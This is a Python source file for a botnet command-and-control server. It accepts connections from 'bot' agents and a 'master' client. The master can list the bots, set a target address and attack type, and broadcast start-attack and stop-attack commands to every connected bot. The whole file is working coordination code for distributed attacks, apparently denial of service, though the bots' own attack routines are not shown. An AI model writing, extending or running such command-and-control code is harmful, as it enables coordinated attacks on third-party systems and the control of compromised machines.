import socket
import sys
from typing import Any
import select
import argparse

RECV_BUFFER = 4096
ENCODING = 'utf-8'


class Server():

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.sock: socket.socket = None
        self.socket_list: list[socket.socket] = []
        self.bot_agents: dict[socket.socket, Any] = {}
        self.master_client: socket.socket = None
        self.target_address: str = ''
        self.attk_type: int = 0
        self.attacking: bool = False

    def start(self) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen()
        self.socket_list.append(self.sock)
        print(f"listening for connections on {self.host}:{self.port}")

        try:
            while True:
                read_sockets, _, exception_sockets = select.select(
                    self.socket_list, [], self.socket_list
                )

                for notified_socket in read_sockets:
                    # New connection
                    if notified_socket == self.sock:
                        conn, _ = self.sock.accept()
                        self._accept_wrapper(conn)
                    # New request
                    else:
                        self._request_router(notified_socket)

                for notified_socket in exception_sockets:
                    self._disconnect_wrapper(notified_socket)

        except KeyboardInterrupt:
            print('caught keyboard interrupt, exiting')
        except Exception as e:
            print(f'ran into an error:\n\t{e}')
        finally:
            self.sock.close()
            sys.exit()

    def _accept_wrapper(self, notified_sock: socket.socket) -> None:
        self.socket_list.append(notified_sock)
        print(f'New client connected > {str(notified_sock.getpeername())}')
        # Ask client for identification
        notified_sock.send('whoami:_'.encode(ENCODING))

    def _request_router(self, sock: socket.socket) -> None:
        sock_addr = sock.getpeername()
        recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
        print(f'received request from ${recv_data}')
        try:
            if recv_data:
                try:
                    req_type, req_body = recv_data.split(':')
                    if req_type == 'iam':   # iam request applies to both master and bot agent
                        self._iam_handler(sock, req_body)
                    elif sock in self.bot_agents:
                        self._bot_handler(sock, req_type, req_body)
                    elif sock == self.master_client:
                        self._master_handler(sock, req_type, req_body)
                    else:
                        print(
                            f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
                        )
                        response = f'{req_type}:error:cannot handle request'.encode(
                            ENCODING)
                        sock.send(response)
                except ValueError:
                    print(f'cannot parse request!')
                    response = '_:error:cannot parse request'.encode(ENCODING)
                    sock.send(response)
            # No data received means that client closed gracefully
            else:
                self._disconnect_wrapper(sock)
        # Abrupt client disconnect
        except Exception as e:
            print(e)
            self._disconnect_wrapper(sock)

    def _iam_handler(self, sock: socket.socket, body: str) -> None:
        if body == 'master':
            self.master_client = sock
            response = 'iam:success:master identified'
        elif body == 'bot':
            self.bot_agents[sock] = sock.getsockname()
            response = 'iam:success:bot identified'
        else:
            response = 'iam:error:unknown type'

        sock.send(response.encode(ENCODING))

    def _master_handler(self, sock: socket.socket, type: str, body: str) -> None:
        if type == 'listbot':
            if len(self.bot_agents) == 0:
                response = 'listbot: '
            else:
                list_bot = ''
                for bot in self.bot_agents:
                    list_bot += repr(self.bot_agents[bot]) + ','
                response = ('listbot:' + list_bot)
        elif type == 'changeip':
            # TODO: check if valid ip/address
            self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
            self.target_address = body
            return
        elif type == 'changattk':
            # TODO: check if valid attack
            self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
            self.attk_type = body
            return
        elif type == 'startattk':
            if not self.target_address:
                response = 'startattk:error:no target set'
            elif not self.attk_type:
                response = 'startattk:error:no attack type set'
            elif self.attacking:
                response = 'startattk:error:already attacking'
            else:
                self._bot_broadcast('startattk:True'.encode(ENCODING))
                self.attacking = True
                response = 'startattk:success:started attack'
        elif type == 'stopattk':
            if not self.target_address or not self.attacking or not self.attk_type:
                response = 'stopattk:error:no attack in progress'
            else:
                self._bot_broadcast('stopattk:True'.encode(ENCODING))
                self.attacking = False
                response = 'stopattk:success:stopped attack'
        else:
            response = f'{type}:error:unknown command'

        sock.send(response.encode(ENCODING))

    def _bot_handler(self, sock: socket.socket, type: str, body: str) -> None:
        pass

    def _bot_broadcast(self, message: bytes) -> None:
        for sock in self.bot_agents:
            sock.send(message)

    def _disconnect_wrapper(self, sock: socket.socket) -> None:
        self.socket_list.remove(sock)
        sock_addr = repr(sock.getpeername())

        # bot agent disconnect
        if sock in self.bot_agents:
            del self.bot_agents[sock]

            if self.master_client:
                self.master_client.send(
                    f'botleft:{sock_addr}'.encode(ENCODING))

            print(f'bot agent {sock_addr} disconnected')
        # master client disconnect
        elif self.master_client == sock:
            self.master_client = None
            print(f'master client {sock_addr} disconnected')
        else:
            print(f'client {sock_addr} disconnected')


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Handler Server')
    parser.add_argument('host', help='Interface the server listens at')
    parser.add_argument('-p', metavar='PORT', type=int, default=8080,
                        help='TCP port (default 8080)')
    args = parser.parse_args()

    server = Server(args.host, args.p)
    server.start()
